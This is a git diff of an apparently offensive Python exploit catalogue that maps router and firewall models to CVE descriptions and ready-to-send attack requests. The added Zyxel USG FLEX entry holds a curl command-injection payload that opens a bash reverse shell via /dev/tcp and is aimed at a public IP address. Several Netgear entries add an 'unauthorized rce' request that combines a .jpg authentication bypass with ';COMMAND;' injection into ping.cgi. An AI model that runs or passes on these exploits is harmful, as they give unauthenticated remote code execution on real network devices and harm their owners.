@@ -622,7 +622,12 @@ model_exp_dic["Cisco_RV130"] = {
 
 model_exp_dic["Zyxel_USG_FLEX_500"] = {
     "CVE-2022-30525":
-["A OS command injection vulnerability in the CGI program of Zyxel USG FLEX 100(W) firmware versions 5.00 through 5.21 Patch 1, USG FLEX 200 firmware versions 5.00 through 5.21 Patch 1, USG FLEX 500 firmware versions 5.00 through 5.21 Patch 1, USG FLEX 700 firmware versions 5.00 through 5.21 Patch 1, USG FLEX 50(W) firmware versions 5.10 through 5.21 Patch 1, USG20(W)-VPN firmware versions 5.10 through 5.21 Patch 1, ATP series firmware versions 5.10 through 5.21 Patch 1, VPN series firmware versions 4.60 through 5.21 Patch 1, which could allow an attacker to modify specific files and then execute some OS commands on a vulnerable device.\n['http://packetstormsecurity.com/files/167176/Zyxel-Remote-Command-Execution.html', 'http://packetstormsecurity.com/files/167182/Zyxel-Firewall-ZTP-Unauthenticated-Command-Injection.html', 'http://packetstormsecurity.com/files/167372/Zyxel-USG-FLEX-5.21-Command-Injection.html', 'http://packetstormsecurity.com/files/168202/Zyxel-Firewall-SUID-Binary-Privilege-Escalation.html', 'https://www.zyxel.com/support/Zyxel-security-advisory-for-OS-command-injection-vulnerability-of-firewalls.shtml']", '\nPOST /ztp/cgi-bin/handler HTTP/1.1\nHost: host\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36\nContent-Type: application/json\nConnection: close\nContent-Length: 165\n\n{"command":"setWanPortSt","proto":"dhcp","port":"4","vlan_tagged"\n:"1","vlanid":"5","mtu":";Command;","data":"hi"}\n']
+["A OS command injection vulnerability in the CGI program of Zyxel USG FLEX 100(W) firmware versions 5.00 through 5.21 Patch 1, USG FLEX 200 firmware versions 5.00 through 5.21 Patch 1, USG FLEX 500 firmware versions 5.00 through 5.21 Patch 1, USG FLEX 700 firmware versions 5.00 through 5.21 Patch 1, USG FLEX 50(W) firmware versions 5.10 through 5.21 Patch 1, USG20(W)-VPN firmware versions 5.10 through 5.21 Patch 1, ATP series firmware versions 5.10 through 5.21 Patch 1, VPN series firmware versions 4.60 through 5.21 Patch 1, which could allow an attacker to modify specific files and then execute some OS commands on a vulnerable device.\n['http://packetstormsecurity.com/files/167176/Zyxel-Remote-Command-Execution.html', 'http://packetstormsecurity.com/files/167182/Zyxel-Firewall-ZTP-Unauthenticated-Command-Injection.html', 'http://packetstormsecurity.com/files/167372/Zyxel-USG-FLEX-5.21-Command-Injection.html', 'http://packetstormsecurity.com/files/168202/Zyxel-Firewall-SUID-Binary-Privilege-Escalation.html', 'https://www.zyxel.com/support/Zyxel-security-advisory-for-OS-command-injection-vulnerability-of-firewalls.shtml']", 
+"""
+curl -kv --insecure -X POST -H "Content-Type: application/json" -d '{"command":"setWanPortSt","proto":"dhcp","port":"4","vlan_tagged":"1","vlanid":"5","mtu":";bash -c \"bash -i &>/dev/tcp/127.0.0.1/8888 <&1;\";","data":"hi"}' https://74.105.155.163//ztp/cgi-bin/handler
+\nPOST /ztp/cgi-bin/handler HTTP/1.1\nHost: host\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36\nContent-Type: application/json\nConnection: close\nContent-Length: 165\n\n{"command":"setWanPortSt","proto":"dhcp","port":"4","vlan_tagged"\n:"1","vlanid":"5","mtu":";Command;","data":"hi"}\n
+"""
+]
 }
 
 model_exp_dic["Buffalo_WSR-2533DHPL"] = {
@@ -693,14 +698,14 @@ print res
 # |/tmp/bd
 
 model_exp_dic["Netgear_D7000v1"] = {
-    "CVE-2021-45511":["Certain NETGEAR devices are affected by authentication bypass. This affects AC2100 before 2021-08-27, AC2400 before 2021-08-27, AC2600 before 2021-08-27, D7000 before 2021-08-27, R6220 before 2021-08-27, R6230 before 2021-08-27, R6260 before 2021-08-27, R6330 before 2021-08-27, R6350 before 2021-08-27, R6700v2 before 2021-08-27, R6800 before 2021-08-27, R6850 before 2021-08-27, R6900v2 before 2021-08-27, R7200 before 2021-08-27, R7350 before 2021-08-27, R7400 before 2021-08-27, and R7450 before 2021-08-27.\n['MISC:https://kb.netgear.com/000063961/Security-Advisory-for-Authentication-Bypass-Vulnerability-on-the-D7000-and-Some-Routers-PSV-2021-0133','https://kb.netgear.com/000063961/Security-Advisory-for-Authentication-Bypass-Vulnerability-on-the-D7000-and-Some-Routers-PSV-2021-0133']",
+    "CVE-2021-45511":["Certain NETGEAR devices are affected by authentication bypass. This affects AC2100 before 2021-08-27, AC2400 before 2021-08-27, AC2600 before 2021-08-27, D7000 before 2021-08-27, R6220 before 2021-08-27, R6230 before 2021-08-27, R6260 before 2021-08-27, R6330 before 2021-08-27, R6350 before 2021-08-27, R6700v2 before 2021-08-27, R6800 before 2021-08-27, R6850 before 2021-08-27, R6900v2 before 2021-08-27, R7200 before 2021-08-27, R7350 before 2021-08-27, R7400 before 2021-08-27, and R7450 before 2021-08-27.\n['MISC:https://kb.netgear.com/000063961/Security-Advisory-for-Authentication-Bypass-Vulnerability-on-the-D7000-and-Some-Routers-PSV-2021-0133'\n'https://kb.netgear.com/000063961/Security-Advisory-for-Authentication-Bypass-Vulnerability-on-the-D7000-and-Some-Routers-PSV-2021-0133']",
                       'curl -k -v "http://192.168.0.1/setup.cgi?next_file=BRS_swisscom_success.html&x=todo=PNPX_GetShareFolderList"'
                       ]   
 }
 
 
 model_exp_dic["Netgear_R6330"] = {
-    "CVE-2021-45511":["Certain NETGEAR devices are affected by authentication bypass. This affects AC2100 before 2021-08-27, AC2400 before 2021-08-27, AC2600 before 2021-08-27, D7000 before 2021-08-27, R6220 before 2021-08-27, R6230 before 2021-08-27, R6260 before 2021-08-27, R6330 before 2021-08-27, R6350 before 2021-08-27, R6700v2 before 2021-08-27, R6800 before 2021-08-27, R6850 before 2021-08-27, R6900v2 before 2021-08-27, R7200 before 2021-08-27, R7350 before 2021-08-27, R7400 before 2021-08-27, and R7450 before 2021-08-27.\n['MISC:https://kb.netgear.com/000063961/Security-Advisory-for-Authentication-Bypass-Vulnerability-on-the-D7000-and-Some-Routers-PSV-2021-0133','https://kb.netgear.com/000063961/Security-Advisory-for-Authentication-Bypass-Vulnerability-on-the-D7000-and-Some-Routers-PSV-2021-0133']",
+    "CVE-2021-45511":["Certain NETGEAR devices are affected by authentication bypass. This affects AC2100 before 2021-08-27, AC2400 before 2021-08-27, AC2600 before 2021-08-27, D7000 before 2021-08-27, R6220 before 2021-08-27, R6230 before 2021-08-27, R6260 before 2021-08-27, R6330 before 2021-08-27, R6350 before 2021-08-27, R6700v2 before 2021-08-27, R6800 before 2021-08-27, R6850 before 2021-08-27, R6900v2 before 2021-08-27, R7200 before 2021-08-27, R7350 before 2021-08-27, R7400 before 2021-08-27, and R7450 before 2021-08-27.\n['MISC:https://kb.netgear.com/000063961/Security-Advisory-for-Authentication-Bypass-Vulnerability-on-the-D7000-and-Some-Routers-PSV-2021-0133'\n'https://kb.netgear.com/000063961/Security-Advisory-for-Authentication-Bypass-Vulnerability-on-the-D7000-and-Some-Routers-PSV-2021-0133']",
                       'http://192.168.0.1/setup.cgi?next_file=BRS_swisscom_success.html&x=todo=PNPX_GetShareFolderList'
                       ]   
 }
@@ -711,7 +716,68 @@ model_exp_dic["Netgear_MBR1515"] = {
 ["Certain NETGEAR devices allow unauthenticated access to critical .cgi and .htm pages via a substring ending with .jpg, such as by appending ?x=1.jpg to a URL. This affects MBR1515, MBR1516, DGN2200, DGN2200M, DGND3700, WNR2000v2, WNDR3300, WNDR3400, WNR3500, and WNR834Bv2.\n['https://github.com/zer0yu/CVE_Request/blob/master/netgear/Netgear_web_interface_exists_authentication_bypass.md']",
     """
     #unauthorized rce
-    curl -v 'http://2.226.202.209:8090/ping.cgi?x=1.jpg&ping_IPAddr=;COMMAND;' --header "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:108.0) Gecko/20100101 Firefox/108.0" --header "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8" --header "Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2" --header "Accept-Encoding: gzip, deflate" --header "Connection: close" --header "Upgrade-Insecure-Requests: 1"
+    curl -v 'http://192.168.0.1/ping.cgi?x=1.jpg&ping_IPAddr=;COMMAND;' --header "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:108.0) Gecko/20100101 Firefox/108.0" --header "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8" --header "Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2" --header "Accept-Encoding: gzip, deflate" --header "Connection: close" --header "Upgrade-Insecure-Requests: 1"
+    """
+ ]
+}
+
+model_exp_dic["Netgear_MBR1516"] = {
+    "CVE-2019-17373":
+["Certain NETGEAR devices allow unauthenticated access to critical .cgi and .htm pages via a substring ending with .jpg, such as by appending ?x=1.jpg to a URL. This affects MBR1515, MBR1516, DGN2200, DGN2200M, DGND3700, WNR2000v2, WNDR3300, WNDR3400, WNR3500, and WNR834Bv2.\n['https://github.com/zer0yu/CVE_Request/blob/master/netgear/Netgear_web_interface_exists_authentication_bypass.md']",
+    """
+    #unauthorized rce
+    curl -v 'http://192.168.0.1/ping.cgi?x=1.jpg&ping_IPAddr=;COMMAND;' --header "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:108.0) Gecko/20100101 Firefox/108.0" --header "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8" --header "Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2" --header "Accept-Encoding: gzip, deflate" --header "Connection: close" --header "Upgrade-Insecure-Requests: 1"
+    """
+ ]
+}
+
+
+model_exp_dic["Netgear_DGN2200M"]= {
+    "CVE-2019-17373":
+["Certain NETGEAR devices allow unauthenticated access to critical .cgi and .htm pages via a substring ending with .jpg, such as by appending ?x=1.jpg to a URL. This affects MBR1515, MBR1516, DGN2200, DGN2200M, DGND3700, WNR2000v2, WNDR3300, WNDR3400, WNR3500, and WNR834Bv2.\n['https://github.com/zer0yu/CVE_Request/blob/master/netgear/Netgear_web_interface_exists_authentication_bypass.md']",
+    """
+    #unauthorized rce
+    curl -v 'http://192.168.0.1/ping.cgi?x=1.jpg&ping_IPAddr=;COMMAND;' --header "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:108.0) Gecko/20100101 Firefox/108.0" --header "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8" --header "Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2" --header "Accept-Encoding: gzip, deflate" --header "Connection: close" --header "Upgrade-Insecure-Requests: 1"
+    """
+ ]
+}
+
+model_exp_dic["Netgear_WNDR3400"] = {
+    "CVE-2019-17373":
+["Certain NETGEAR devices allow unauthenticated access to critical .cgi and .htm pages via a substring ending with .jpg, such as by appending ?x=1.jpg to a URL. This affects MBR1515, MBR1516, DGN2200, DGN2200M, DGND3700, WNR2000v2, WNDR3300, WNDR3400, WNR3500, and WNR834Bv2.\n['https://github.com/zer0yu/CVE_Request/blob/master/netgear/Netgear_web_interface_exists_authentication_bypass.md']",
+    """
+    #unauthorized rce
+    curl -v 'http://192.168.0.1/ping.cgi?x=1.jpg&ping_IPAddr=;COMMAND;' --header "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:108.0) Gecko/20100101 Firefox/108.0" --header "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8" --header "Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2" --header "Accept-Encoding: gzip, deflate" --header "Connection: close" --header "Upgrade-Insecure-Requests: 1"
+    """
+ ]
+}
+
+model_exp_dic["Netgear_WNR3500"] = {
+    "CVE-2019-17373":
+["Certain NETGEAR devices allow unauthenticated access to critical .cgi and .htm pages via a substring ending with .jpg, such as by appending ?x=1.jpg to a URL. This affects MBR1515, MBR1516, DGN2200, DGN2200M, DGND3700, WNR2000v2, WNDR3300, WNDR3400, WNR3500, and WNR834Bv2.\n['https://github.com/zer0yu/CVE_Request/blob/master/netgear/Netgear_web_interface_exists_authentication_bypass.md']",
+    """
+    #unauthorized rce
+    curl -v 'http://192.168.0.1/ping.cgi?x=1.jpg&ping_IPAddr=;COMMAND;' --header "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:108.0) Gecko/20100101 Firefox/108.0" --header "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8" --header "Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2" --header "Accept-Encoding: gzip, deflate" --header "Connection: close" --header "Upgrade-Insecure-Requests: 1"
+    """
+ ]
+}
+
+model_exp_dic["Netgear_WNR834Bv2"] = {
+    "CVE-2019-17373":
+["Certain NETGEAR devices allow unauthenticated access to critical .cgi and .htm pages via a substring ending with .jpg, such as by appending ?x=1.jpg to a URL. This affects MBR1515, MBR1516, DGN2200, DGN2200M, DGND3700, WNR2000v2, WNDR3300, WNDR3400, WNR3500, and WNR834Bv2.\n['https://github.com/zer0yu/CVE_Request/blob/master/netgear/Netgear_web_interface_exists_authentication_bypass.md']",
+    """
+    #unauthorized rce
+    curl -v 'http://192.168.0.1/ping.cgi?x=1.jpg&ping_IPAddr=;COMMAND;' --header "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:108.0) Gecko/20100101 Firefox/108.0" --header "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8" --header "Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2" --header "Accept-Encoding: gzip, deflate" --header "Connection: close" --header "Upgrade-Insecure-Requests: 1"
+    """
+ ]
+}
+
+model_exp_dic["Netgear_WNDR3300"]  = {
+    "CVE-2019-17373":
+["Certain NETGEAR devices allow unauthenticated access to critical .cgi and .htm pages via a substring ending with .jpg, such as by appending ?x=1.jpg to a URL. This affects MBR1515, MBR1516, DGN2200, DGN2200M, DGND3700, WNR2000v2, WNDR3300, WNDR3400, WNR3500, and WNR834Bv2.\n['https://github.com/zer0yu/CVE_Request/blob/master/netgear/Netgear_web_interface_exists_authentication_bypass.md']",
+    """
+    #unauthorized rce
+    curl -v 'http://192.168.0.1/ping.cgi?x=1.jpg&ping_IPAddr=;COMMAND;' --header "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:108.0) Gecko/20100101 Firefox/108.0" --header "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8" --header "Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2" --header "Accept-Encoding: gzip, deflate" --header "Connection: close" --header "Upgrade-Insecure-Requests: 1"
     """
  ]
 }
